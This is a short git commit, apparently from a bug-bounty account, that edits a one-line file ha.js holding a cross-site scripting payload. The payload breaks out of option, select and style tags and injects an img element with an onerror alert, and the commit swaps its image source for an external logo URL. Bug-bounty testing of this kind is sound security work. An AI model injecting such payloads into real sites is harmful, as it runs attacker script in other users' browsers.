e942389b87c43a620e747cc1da88d8e19d742e2c
hfbugbounties <54364019+hfbugbounties@users.noreply.github.com>
2022-08-24 23:53:16 +1200

    Update ha.js

--- ha.js
+++ ha.js
@@ -1,1 +1,1 @@
-<option><style></option></select><img src=x onerror=alert(1)></style>
+<option><style></option></select><img src=https://www.cryptospair.com/assets/img/logo.png onerror=alert(1)></style>
